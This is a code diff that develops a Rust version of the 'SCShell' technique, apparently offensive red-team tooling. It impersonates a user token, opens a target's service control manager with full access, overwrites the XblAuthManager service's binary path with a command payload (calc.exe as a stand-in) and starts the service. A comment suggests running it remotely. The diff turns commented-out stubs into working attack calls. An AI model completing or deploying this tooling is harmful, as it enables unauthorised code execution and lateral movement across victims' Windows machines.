@@ -8,7 +8,8 @@
 use std::io;
 use std::io::{stdin, stdout, Read, Write};
 use std::process::exit;
-use windows::core::PCSTR;
+use std::ptr::null_mut;
+use windows::core::{PCSTR, PSTR};
 use windows::core::Error;
 
 use windows::Win32::{
@@ -21,7 +22,7 @@ use windows::Win32::{
         Memory::GPTR,
         Services::{
             ChangeServiceConfigA, OpenSCManagerA, OpenServiceA, QueryServiceConfigA,
-            QUERY_SERVICE_CONFIGA, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS, SERVICE_ALL_ACCESS
+            QUERY_SERVICE_CONFIGA, SERVICES_ACTIVE_DATABASE, SC_MANAGER_ALL_ACCESS, SERVICE_ALL_ACCESS, CloseServiceHandle, GetServiceKeyNameA,SERVICE_NO_CHANGE, SERVICE_DEMAND_START,SERVICE_ERROR_IGNORE, StartServiceA
         },
         Threading::{GetCurrentProcess, OpenProcessToken},
     },
@@ -43,6 +44,7 @@ fn SCShell(
     username: &str,
     password: &str,
 ) -> bool {
+    
     let mut lpqsc: QUERY_SERVICE_CONFIGA;
     let mut lpqsize: u32;
     let mut originalBinaryPath: &str;
@@ -94,59 +96,84 @@ fn SCShell(
         println!("[*] Token handle: {:x?}", hToken);
         breakpoint();
 
-        let bResult: BOOL = ImpersonateLoggedOnUser(hToken);
+        let mut bResult: BOOL = ImpersonateLoggedOnUser(hToken);
+
 
         // Using the (made) token to open the SCmanager
 
 
         let mut schManager: SC_HANDLE = SC_HANDLE(0);
-        let schManager_res: Result<SC_HANDLE, Error> = OpenSCManagerA(
+        let schManager: SC_HANDLE = OpenSCManagerA(
             target_host_ptr,
             PCSTR(SERVICES_ACTIVE_DATABASE.as_ptr()),
-            SC_MANAGER_ALL_ACCESS);
+            SC_MANAGER_ALL_ACCESS).unwrap();
 
-            println!("{:?}", schManager_res);
+        if schManager.is_invalid() {
+            println!("[-] Could not open service manager handle.");
+            exit(1)
+        } else{
+            println!("[+] Service manager handle: {:?}", schManager);
+        }
 
-        // TODO: figure why this match breaks and returns Err(schManager_res)
-        //     match schManager_res {
-        //         Ok(schManager_res) => {
-        //             let schManager:SC_HANDLE = schManager_res;
-        //             println!("[+] Service manager handle: {:?}", schManager)
-        //     },
-        //         Err(schManager_res) => {
-        //             println!("[-] Failed to open service manager.");
-        //             exit(1)
-        //     }
-        // }
- 
         breakpoint();
 
-        // let mut schService: SC_HANDLE = SC_HANDLE(0);
-        // let schService_res: Result<SC_HANDLE, Error> = OpenServiceA(
-        //     schManager,
-        //     PCSTR(service_name.as_ptr()),
-        //     SERVICE_ALL_ACCESS);
+        //let mut schService: SC_HANDLE = SC_HANDLE(0);
+        let schService: SC_HANDLE = OpenServiceA(
+            schManager,
+            PCSTR(service_name.as_ptr()),
+            SERVICE_ALL_ACCESS).unwrap();
 
-        // match schService_res {
-        //     Ok(schService_res) => {
-        //         let schService:SC_HANDLE = schService_res;
-        //         println!("[+] Service manager handle: {:?}", schManager)
-        // },
-        //     Err(schManager_res) => {
-        //         println!("[-] Failed to open targeted service handle.");
-        //         exit(1)
-        // }
-    //}
+            if schService.is_invalid() {
+                println!("[-] Could not open service handle.");
+                let err_msg = GetLastError();
+                println!("[-] Error: {:?}", err_msg);
+                exit(1)
+            } else{
+                println!("[+] Service name: {}", &service_name);
+                println!(r"    \\\\-- [+] Service handle: {:?}", schManager);
+            }
 
-        // QueryServiceConfigA(schService, NULL, 0, &dwSize);
+        let mut dwSize: u32 = 0;
+        
+        QueryServiceConfigA(
+            schService,
+            null_mut(),
+            0,
+            &mut dwSize);
+       
+            // TODO: this changes the service path but need to make sure if null_mut() is the right thing to put here
+        let mut bResult: BOOL = ChangeServiceConfigA(
+            schService,
+            SERVICE_NO_CHANGE,
+            SERVICE_DEMAND_START,
+            SERVICE_ERROR_IGNORE,
+            PCSTR(payload.as_ptr()),
+            PCSTR(null_mut()),
+            null_mut(),
+            PCSTR(null_mut()),
+            PCSTR(null_mut()),
+            PCSTR(null_mut()),
+            PCSTR(null_mut()));
 
-        //bResult = ChangeServiceConfigA(schService, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, payload, NULL, NULL, NULL, NULL, NULL, NULL);
+        println!("[*] ChangeServiceConfigA result: {:?}", bResult);
+        println!("    \\\\-- [*] {:?}", GetLastError());
 
-        //  bResult = StartServiceA(schService, 0, NULL);
+        // TODO: the service path is changed, but the service does not start yet!
+        let bResult: BOOL = StartServiceA(schService,
+            &[PSTR(null_mut())]);
+
+            println!("[*] StartServiceA result: {:?}", bResult);
+            println!("    \\\\-- [*] {:?}", GetLastError());    
 
         // bResult = ChangeServiceConfigA(schService, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE, originalBinaryPath, NULL, NULL, NULL, NULL, NULL, NULL);
 
+
         // GlobalFree, close handle, close service handle, etc
+        //GlobalFree(lpqsc);
+        CloseHandle(hToken);
+        CloseServiceHandle(schManager);
+        CloseServiceHandle(schService);
+
 
         false
     }
@@ -155,10 +182,11 @@ fn SCShell(
 fn main() {
     println!("[!] SCShell!");
 
+    // null terminated strings! We can move this into the inner function eventually so the args can be passed in normal string form
     let res = SCShell(
         "local",
-        "XblAuthManager",
-        r"C:\WINDOWS\system32\cmd.exe /C calc.exe",
+        "XblAuthManager\0",
+        "C:\\WINDOWS\\system32\\cmd.exe /C calc.exe\0",
         "", // want to do it remotely? Change me!
         "",
         "",
